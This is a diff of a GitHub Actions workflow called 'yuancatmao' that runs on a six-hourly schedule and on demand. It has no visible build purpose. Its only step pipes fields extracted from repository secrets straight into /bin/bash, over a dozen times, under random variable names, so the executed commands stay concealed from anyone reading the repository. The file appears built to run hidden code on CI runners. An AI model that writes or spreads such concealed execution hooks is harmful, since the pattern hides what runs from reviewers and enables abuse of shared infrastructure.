@@ -1,28 +1,30 @@
 name: yuancatmao
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 3/6 * * *'
-jobs:  # 13007
+    - cron: '34 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuancatmao
         env:
-          ydmcm19911: ${{ secrets.ydmcm19911 }}
+          qdf3162: ${{ secrets.qdf3162 }}
         run: |
-          echo $ydmcm19911 | jq -r .je2 | /bin/bash
-          echo $wyxo615 | jq -r .ngrh22294 | /bin/bash
-          echo $mrly78 | jq -r .fnbzx929 | /bin/bash
-          echo $ad4 | jq -r .sqvhm9 | /bin/bash
-          echo $xclp0 | jq -r .imcv5 | /bin/bash
-          echo $eqqu8266 | jq -r .y2 | /bin/bash
-          echo $thv45704 | jq -r .xgqa89 | /bin/bash
-          echo $sjutt17410 | jq -r .xo8837 | /bin/bash
-          echo $sdc547 | jq -r .xihv4938 | /bin/bash
-          echo $h2290 | jq -r .qccae068 | /bin/bash
-          echo $vm5762 | jq -r .vyy841 | /bin/bash
-          echo $qr16 | jq -r .i0 | /bin/bash
+          echo $qdf3162 | jq -r .b19670 | /bin/bash
+          echo $zx44807 | jq -r .jod364 | /bin/bash
+          echo $vt62428 | jq -r .ll452 | /bin/bash
+          echo $i502 | jq -r .rtgo15813 | /bin/bash
+          echo $vwjlw59799 | jq -r .hsl311 | /bin/bash
+          echo $d11160 | jq -r .bxpie682 | /bin/bash
+          echo $xna0 | jq -r .pfnac277 | /bin/bash
+          echo $af6312 | jq -r .ebsbt818 | /bin/bash
+          echo $ju448 | jq -r .xksh00139 | /bin/bash
+          echo $eq362 | jq -r .web04270 | /bin/bash
+          echo $khyj32995 | jq -r .p50084 | /bin/bash
+          echo $bgk58988 | jq -r .l61 | /bin/bash
+          echo $fo85 | jq -r .q060 | /bin/bash
+          echo $zyl15221 | jq -r .se97 | /bin/bash
 
